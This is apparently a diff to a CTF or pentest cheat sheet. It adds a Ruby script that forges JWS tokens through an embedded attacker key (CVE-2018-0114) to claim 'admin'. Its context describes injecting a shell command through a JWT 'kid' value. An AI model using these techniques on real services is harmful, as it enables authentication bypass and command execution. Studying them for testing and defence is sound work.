@@ -392,6 +392,38 @@ Step-by-step:
 
 We can run code execution here if the server using `ruby` with `Kernel.open/open` (**Ruby will run the filename as a command if the filename starts with `|`**). Look the CVE [here](https://www.ruby-lang.org/en/news/2017/12/14/net-ftp-command-injection-cve-2017-17405/). We just need to change the `kid` value to `| your-command-here` and we good to go! We don't need to change the payload or the secret because the code execution will occurs before the secret key is used. 
 
+## JWS embedded jwk
+It's [CVE-2018-0114](https://nvd.nist.gov/vuln/detail/CVE-2018-0114). The header and the payload are base64 without padding (Base64({})), but the signature is base64 encoded.
+
+Here is the example code:
+
+```ruby
+# eyJhbGciOiJSUzI1NiIsImtpZCI6IlJYODdQUl96YVBFVkowNlBIUVBZb0MxZHVUVnBrTG5Ia01XajB6bzBoRTAifQ.
+# YWJj.
+# guPNBE8BAP3ZOXrUXu_pOv7TD9qxuzy1X0vR17EW1XeIYiV6n4ayw-9lX2eHk3-fdTxy-OiF2RMFhQcU8lN5qcsn1QtXCzmMkvYIw4xkBplu_LhUGeqvzKzg7CccC0F4sD8ZED3q9sYopcy7Mcnx_JOhpTtWs4ZjV7NURCl32jBuhSbuPQeaIebzbPlCgAZH8As5j1W0Knt_14au7N4PC4T1izmvk_vucmz3iGmTCgVoiQqz1YJd3LbSlEet3nao24kbEiURzGhCNGjSb6Qab2DHUz9CkPnX47UdIvSsfLtQ6GOh2pzvRXuK3A21OLeu4p0E_21Y-HEt1NATj-Qujg
+
+# run this first 
+# $ openssl genrsa -out private.pem 2048
+
+require 'json'
+require 'openssl'
+require 'base64'
+
+priv_key = OpenSSL::PKey::RSA.new File.read 'private.pem'
+pub_key = priv_key.public_key
+n = Base64.urlsafe_encode64(pub_key.n.to_s(2)).gsub(/=+$/, "")
+e = Base64.urlsafe_encode64(pub_key.e.to_s(2)).gsub(/=+$/, "")
+
+header = {"alg":"RS256", "jwk" => {"kty" => "RSA", "kid" => "hello", "use" => "sig", "n" => n, "e" => e }}
+
+# Our payload goes here
+payload = Base64.urlsafe_encode64("admin").gsub(/=+$/, "")
+token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/, "") + "." + payload
+sign = priv_key.sign("SHA256", token)
+
+puts token + "." + Base64.urlsafe_encode64(sign).gsub(/=+$/, "")
+```
+
 ## Leaked .git
 We can [this](https://github.com/internetwache/GitTools) tools to extract leaked `.git/` directory
 
